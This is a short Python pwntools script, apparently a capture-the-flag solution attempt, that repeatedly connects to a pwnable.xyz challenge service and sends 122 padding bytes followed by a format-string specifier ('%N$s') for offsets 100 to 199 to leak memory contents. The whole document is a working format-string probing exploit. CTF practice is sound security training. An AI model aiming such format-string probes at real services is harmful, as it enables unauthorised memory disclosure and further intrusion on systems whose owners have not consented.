from pwn import *

for i in range(100,200):
    p = remote('svc.pwnable.xyz', 30004)
    payload = 'A'*122
    payload+='%'+str(i)+'$s'
    print p.recv()
    p.sendline('y')
    print p.recv()
    p.sendline(payload)
    print p.recvall()
    p.close()
